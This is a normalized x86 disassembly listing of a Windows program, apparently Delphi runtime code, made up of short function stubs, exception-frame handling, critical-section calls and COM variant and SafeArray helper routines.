call GlobalFree
retn
sub_406ccc
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406d04
call sub_406c74
retn
sub_406d0c
call sub_406c74
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406ee9
jmp sub_4038c0
sub_406ef0
pop ebp
retn
sub_406ef4
sub [ rw-data ] 0x1
retn
sub_406f21
jmp sub_4038c0
sub_406f28
pop ebp
retn
sub_406f2c
sub [ rw-data ] 0x1
retn
sub_407239
jmp sub_4038c0
sub_407240
pop ebp
retn
sub_407244
sub [ rw-data ] 0x1
retn
sub_407d25
add eax 0xffffffd4
jmp sub_40d344
sub_407d2d
add eax 0xffffffd4
jmp sub_40d1ec
sub_407d35
add eax 0xffffffd4
jmp sub_40d288
sub_407d47
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4059a4
sub_407d51
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4059b8
sub_4082c9
jmp sub_4038c0
sub_4082d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408788
call sub_408764
retn
sub_408820
push eax
call CloseHandle
retn
sub_408890
push ebx
mov ebx eax
mov eax ebx
call sub_408828
inc eax
setne al
pop ebx
retn
sub_408a68
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408a7c
push esi
mov esi eax
xchg edx eax
call sub_4028d8
mov eax esi
pop esi
retn
sub_408c3c
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026dc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408c50
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408c88
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026fc
sub_408cf0
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402838
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408d14
push ebx
mov ebx eax
mov eax ebx
call sub_403f40
pop ebx
retn
sub_409077
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f40
pop eax
pop ebx
retn
sub_40932f
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40948a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4097e7
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4097e7
sub_4098a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404400
mov edx esi
xor ecx ecx
call sub_409730
pop esi
pop ebx
retn
sub_409918
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404400
mov edx esi
mov cl 0x1
call sub_409730
pop esi
pop ebx
retn
sub_409f92
jmp sub_4038c0
sub_409f99
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a08a
jmp sub_4038c0
sub_40a091
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a835
jmp sub_4038c0
sub_40a83c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a8c4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a868
pop ebp
retn 0x8
sub_40aa09
jmp sub_4038c0
sub_40aa10
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40aeb3
jmp sub_4038c0
sub_40aeba
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b3d3
jmp sub_4038c0
sub_40b3da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b485
jmp sub_4038c0
sub_40b48c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b52f
jmp sub_4038c0
sub_40b536
pop esi
pop ecx
pop ebp
retn
sub_40b712
jmp sub_4038c0
sub_40b719
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b770
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40ba62
jmp sub_4038c0
sub_40bb30
jmp sub_4038c0
sub_40bb58
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403120
sub_40bc54
pop ebx
retn
sub_40bcf4
jmp sub_4038c0
sub_40bcfb
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd04
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4038f8
sub_40bd11
retn
sub_40bd14
push ebp
mov ebp esp
call sub_40bc58
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bd04
pop ebp
retn 0x4
sub_40bd30
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
retn
sub_40bdc8
push ebx
mov ebx eax
mov eax ebx
call sub_40bd48
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bf9b
jmp sub_4038c0
sub_40bfa2
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c067
jmp sub_4038c0
sub_40c06e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c078
call sub_40b904
mov eax 0x1
call sub_403ea4
sub_40c1fc
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c2d5
jmp sub_4038c0
sub_40c2f2
jmp sub_4038c0
sub_40c2f9
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c3a4
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c308
mov ecx eax
sub_40c590
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c5b0
push eax
call CharNextA
retn
sub_40c8d4
jmp sub_4038c0
sub_40c8db
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c944
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cd9b
jmp sub_4038c0
sub_40cda2
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cee0
jmp sub_4038c0
sub_40cee7
pop ebx
mov esp ebp
pop ebp
retn
sub_40ceec
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40ce50
sub_40cefc
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cf18
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026fc
pop ebx
retn
sub_40cfa0
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cfac
xchg [ eax ] edx
mov eax edx
retn
sub_40d00c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d09c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d1b4
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d1dc
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d457
jmp sub_4038c0
sub_40d45e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d4cc
jmp sub_4038c0
sub_40d4d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4f1
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d4ea
jmp sub_4038c0
sub_40d4f1
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d941
jmp sub_4038c0
sub_40d948
pop ebp
retn
sub_40d9b4
jmp sub_4038c0
sub_40d9bb
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40da34
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40da9a
jmp sub_4038c0
sub_40daa1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db06
jmp sub_4038c0
sub_40db0d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db72
jmp sub_4038c0
sub_40db79
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dbde
jmp sub_4038c0
sub_40dbe5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc4a
jmp sub_4038c0
sub_40dc51
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcc9
jmp sub_4038c0
sub_40dcd0
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40dd3c
jmp sub_4038c0
sub_40dd43
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40ddac
jmp sub_4038c0
sub_40ddb3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40de20
jmp sub_4038c0
sub_40de27
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40e1ad
jmp sub_4038c0
sub_40e1b4
pop ebp
retn
sub_40e1b8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40de7c
sub_40e1c9
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e852
jmp sub_4038c0
sub_40e859
pop ecx
pop ebp
retn
sub_40e8eb
jmp sub_4038c0
sub_40e8f2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e942
jmp sub_4038c0
sub_40e949
pop ecx
pop ebp
retn
sub_40e996
jmp sub_4038c0
sub_40e99d
pop ecx
pop ebp
retn
sub_40ea2f
jmp sub_4038c0
sub_40ea36
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ea86
jmp sub_4038c0
sub_40ea8d
pop ecx
pop ebp
retn
sub_40ecd5
jmp sub_4038c0
sub_40ecdc
pop ebx
mov esp ebp
pop ebp
retn
sub_40edf2
jmp sub_4038c0
sub_40edf9
pop ecx
pop ebp
retn
sub_40edfc
push ebx
mov ebx eax
mov eax ebx
call sub_40f094
mov [ ebx ] 0x1
pop ebx
retn
sub_40f308
call sub_40f3bc
retn
sub_40f45c
jmp sub_4038c0
sub_40f463
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f4aa
jmp sub_4038c0
sub_40f4b1
pop ebx
pop ecx
pop ebp
retn
sub_40f4f6
jmp sub_4038c0
sub_40f4fd
pop ebx
pop ecx
pop ebp
retn
sub_40f542
jmp sub_4038c0
sub_40f549
pop ebx
pop ecx
pop ebp
retn
sub_40f58e
jmp sub_4038c0
sub_40f595
pop ebx
pop ecx
pop ebp
retn
sub_40f957
jmp sub_4038c0
sub_40f95e
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f9f8
jmp sub_4038c0
sub_40f9ff
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fe6d
jmp sub_40360c
sub_40ff28
jmp sub_40360c
sub_40ffcf
jmp sub_40360c
sub_4100c8
jmp sub_40360c
sub_4101a1
jmp sub_40360c
sub_410289
jmp sub_40360c
sub_410446
jmp sub_4038c0
sub_41044d
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4104af
jmp sub_4038c0
sub_4104b6
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41091c
jmp sub_40360c
sub_410a0b
jmp sub_4038c0
sub_410a12
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410ab0
jmp sub_4038c0
sub_410ab7
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410f09
jmp sub_4038c0
sub_410f10
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410fb9
jmp sub_4038c0
sub_410fc0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4114f5
jmp sub_40360c
sub_4115fc
jmp sub_4038c0
sub_411603
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41170d
jmp sub_4038c0
sub_411714
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411b64
jmp sub_4038c0
sub_411b6b
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411c75
jmp sub_4038c0
sub_411c7c
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4121c2
jmp sub_4038c0
sub_4121c9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41226d
jmp sub_4038c0
sub_412274
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412296
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404638
retn
sub_41228f
jmp sub_4038c0
sub_412296
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4122f2
jmp sub_4038c0
sub_4122f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412375
jmp sub_4038c0
sub_4128bb
jmp sub_4038c0
sub_4128c2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412955
jmp sub_4038c0
sub_41295c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412979
lea eax [ ebp - 0x14 ]
call sub_404620
retn
sub_412972
jmp sub_4038c0
sub_412979
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4129d6
jmp sub_4038c0
sub_4129dd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412a7f
jmp sub_4038c0
sub_412a9c
jmp sub_4038c0
sub_412aa3
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412ffe
jmp sub_4038c0
sub_413005
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413076
jmp sub_4038c0
sub_41307d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413408
push eax
call sub_40f094
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_41341c
push eax
call sub_40f094
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_4135a7
jmp sub_4038c0
sub_4135d3
jmp sub_4038c0
sub_4135da
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413807
jmp sub_4038c0
sub_41380e
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413aaf
jmp sub_4038c0
sub_413b3d
jmp sub_4038c0
sub_413c2d
jmp sub_4038c0
sub_413ccf
jmp sub_4038c0
sub_413d85
jmp sub_4038c0
sub_413e2c
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f3bc
add esp 0x10
sub_4140d6
jmp sub_4038c0
sub_4140dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414120
jmp r-xdata
cmp [ eax ] 0x400c
je r-xdata
mov eax [ eax + 0x8 ]
retn
sub_414130
add eax 0xfffffffe
sub ax 0x2
jb r-xdata
mov al 0x1
retn
sub ax 0x7
je r-xdata
add eax 0xfffffffb
sub ax 0x5
jb r-xdata
xor eax eax
retn
sub_414150
push ebx
mov ebx eax
mov eax ebx
call sub_414120
mov ax [ eax ]
call sub_414130
pop ebx
retn
sub_414164
push ebx
mov ebx eax
mov eax ebx
call sub_414120
cmp [ eax ] 0x0
sete al
pop ebx
retn
sub_414178
push ebx
mov ebx eax
mov eax ebx
call sub_414120
cmp [ eax ] 0x1
sete al
pop ebx
retn
sub_41418c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f094
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4141a4
mov edx 0x80020004
call sub_41418c
retn
sub_414235
jmp sub_4038c0
sub_41423c
pop esi
pop ebx
pop ebp
retn
sub_414240
push ebp
mov ebp esp
call sub_414400
pop ebp
retn 0x4
sub_4142cc
push ebp
mov ebp esp
call sub_414400
pop ebp
retn 0x4
sub_4143af
jmp sub_4038c0
sub_4143b6
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40315c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034e0
sub_4143d8
xor eax eax
retn
sub_4143dc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4143f0
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4143f8
call sub_40e808
retn
sub_414400
call sub_40e8f8
retn
sub_414408
call sub_40eda8
retn
sub_414410
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414424
call sub_414400
retn
sub_41442c
push ebp
mov ebp esp
call sub_414408
pop ebp
retn 0x8
sub_414444
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414520
jmp sub_4038c0
sub_4145e9
jmp sub_4038c0
sub_4145f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41460d
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
sub_414606
jmp sub_4038c0
sub_41460d
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414618
call sub_40edfc
retn
sub_414620
mov ecx 0xf
call sub_413dc4
cmp al 0x1
retn
sub_41469f
jmp sub_4038c0
sub_4146a6
pop ebp
retn
sub_414749
jmp sub_4038c0
sub_414750
pop ebp
retn
sub_4148a1
jmp sub_4038c0
sub_4148a8
pop ebp
retn
sub_4148ac
sub [ rw-data ] 0x1
retn
sub_4148e0
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_414bb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f94
pop esi
pop ebx
retn
sub_414c54
jmp sub_4038c0
sub_414c5b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414d56
jmp sub_4038c0
sub_414d5d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414f5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f3bc
pop esi
pop ebx
retn
sub_4150de
jmp sub_4038c0
sub_4150e5
pop ebp
retn
sub_4150e8
sub [ rw-data ] 0x1
retn
sub_415115
jmp sub_4038c0
sub_41511c
pop ebp
retn
sub_415120
sub [ rw-data ] 0x1
retn
sub_415a05
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4186bc
sub_415c3c
mov esp 0xc000418b
mov eax [ ecx ]
int3
sub_4162ad
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_4166cf
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41eea8
sub_4166d9
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41eec8
sub_4166e3
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_416810
fsub st2
inc ecx
add ah ah
0xeae80041 0x41
sub_41681c
add bl ch
inc ecx
add [ ebx + ebp * 8 ] dh
inc ecx
add [ ebx + ebp * 8 ] al
inc ecx
add [ ebx + ebp * 8 ] cl
inc ecx
add [ eax ] dl
jmp sub_416870
sub_416843
add ah ch
0xead80041 0x41
sub_416a50
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_416b74
mov eax [ eax + 0xc ]
call sub_417d38
retn
sub_416e4b
jmp sub_4038c0
sub_416e52
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416e58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_417ef0
test eax eax
setge al
pop esi
pop ebx
retn
sub_41715b
jmp sub_4038c0
sub_417162
mov esp ebp
pop ebp
retn
sub_417230
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41723c
push ebx
mov ebx edx
mov edx ebx
call sub_417050
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_416db0
sub_4172e8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_417443
jmp sub_4038c0
sub_417517
jmp sub_4038c0
sub_417528
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417594
jmp sub_4038c0
sub_41759b
pop ebx
mov esp ebp
pop ebp
retn
sub_4175e6
jmp sub_4038c0
sub_4175ed
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417679
jmp sub_4038c0
sub_417680
pop ebx
pop ebp
retn
sub_4176c6
jmp sub_4038c0
sub_4176cd
pop ebx
pop ebp
retn
sub_417712
jmp sub_4038c0
sub_417719
pop ebx
pop ebp
retn
sub_417763
jmp sub_4038c0
sub_41776a
pop esi
pop ebx
pop ebp
retn
sub_4177be
jmp sub_4038c0
sub_4177c5
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4178f2
jmp sub_4038c0
sub_4179c8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418030
sub_417ab8
jmp sub_4038c0
sub_417c42
jmp sub_4038c0
sub_417c49
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ce3
jmp sub_4038c0
sub_417cea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d09
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_417d02
jmp sub_4038c0
sub_417d09
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_417d6c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41808c
xor edx edx
mov eax ebx
call sub_418050
pop ebx
retn
sub_417de4
mov eax [ ebp + 0x4 ]
retn
sub_417e1a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_417e68
jmp sub_4038c0
sub_417e6f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417e74
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_417e8c
xor edx edx
call sub_417e94
retn
sub_417f7c
mov edx [ eax + 0x8 ]
dec edx
call sub_417e94
retn
sub_4180fc
retn
sub_4181b6
jmp sub_4038c0
sub_4181bd
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034e0
sub_41824c
jmp sub_4038c0
sub_418253
pop ebx
pop ecx
pop ebp
retn
sub_418258
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_4182af
jmp sub_4038c0
sub_4182b6
pop ebx
pop ecx
pop ebp
retn
sub_4182bc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4182f8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
retn
sub_418310
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_4183eb
retn
sub_4183ec
cmp edx [ eax + 0x4 ]
jae sub_4182f8
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_4184a8
test edx edx
je r-xdata
xor edx edx
call sub_4184bc
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418572
jmp sub_4038c0
sub_418579
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41858c
xchg edx eax
call sub_4184bc
retn
sub_418594
retn
sub_41862d
jmp sub_4038c0
sub_418634
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4187f1
jmp sub_4038c0
sub_4187f8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41888c
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_417ef0
retn
sub_418961
jmp sub_4038c0
sub_418968
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4189ac
xor edx edx
call sub_418868
retn
sub_418b1a
jmp sub_4038c0
sub_418b34
inc [ eax + 0xc ]
retn
sub_418b38
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_418ba2
jmp sub_4038c0
sub_418bb0
dec [ eax + 0xc ]
call sub_418b38
retn
sub_418bbc
xor eax eax
retn
sub_418bc0
push ebx
mov ebx ecx
mov eax ebx
call sub_403f40
pop ebx
retn
sub_418bf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_417e94
pop esi
pop ebx
retn
sub_418cb6
jmp sub_4038c0
sub_418cbd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418dcd
jmp sub_4038c0
sub_418ea8
retn
sub_418eac
retn
sub_418eb0
retn
sub_418eb4
retn
sub_418f20
mov eax [ eax + 0x18 ]
retn
sub_418f9c
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_41902e
jmp sub_4038c0
sub_419035
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419052
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_41904b
jmp sub_4038c0
sub_419052
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4190dc
jmp sub_4038c0
sub_4190f4
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4191b0
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419259
jmp sub_4038c0
sub_419260
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41926c
mov eax [ ebp + 0x4 ]
retn
sub_4192a2
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4192f0
jmp sub_4038c0
sub_4192f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4193b6
jmp sub_4038c0
sub_4193bd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193df
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
sub_4193d8
jmp sub_4038c0
sub_4193df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419457
jmp sub_4038c0
sub_41945e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419464
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4194bd
jmp sub_4038c0
sub_4194c4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4194cc
xor eax eax
retn
sub_419515
jmp sub_4038c0
sub_41951c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41962f
jmp sub_4038c0
sub_419636
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4196c4
jmp sub_4038c0
sub_4196cb
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41979b
jmp sub_4038c0
sub_4197a2
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419858
jmp sub_4038c0
sub_41985f
pop esi
pop ecx
pop ebp
retn
sub_4198e4
jmp sub_4038c0
sub_4198eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419908
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_419901
jmp sub_4038c0
sub_419908
pop esi
pop ebx
pop ecx
